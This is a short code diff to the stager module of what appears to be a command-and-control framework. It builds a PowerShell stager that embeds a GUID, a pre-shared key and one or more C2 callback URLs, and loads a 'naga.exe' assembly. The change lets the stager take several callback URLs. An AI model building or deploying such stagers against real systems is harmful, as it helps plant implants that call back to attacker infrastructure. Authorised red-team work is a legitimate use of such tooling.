@@ -25,8 +25,10 @@ class STStager(Stager):
         with open('./core/teamserver/data/naga.exe', 'rb') as assembly:
             with open('core/teamserver/stagers/templates/posh.ps1') as template:
                 template = template.read()
+                c2_urls = ','.join(
+                    filter(None, [f"{listener.name}://{listener['BindIP']}:{listener['Port']}", listener['CallBackURls']])
+                )
 
-                c2_url = f"{listener.name}://{listener['BindIP']}:{listener['Port']}"
                 guid = uuid.uuid4()
                 psk = gen_stager_psk()
 
@@ -43,10 +45,10 @@ class STStager(Stager):
 
     {template}
 }}
-Invoke-{function_name} -Guid {guid} -Psk {psk} -Url {c2_url}
+Invoke-{function_name} -Guid '{guid}' -Psk '{psk}' -Url '{c2_urls}'
 """
                 else:
-                    template = template.replace("$Url", f'{c2_url}')
+                    template = template.replace("$Url", f'{c2_urls}')
                     template = template.replace("$Guid", f'{guid}')
                     template = template.replace("$Psk", f'{psk}')
 
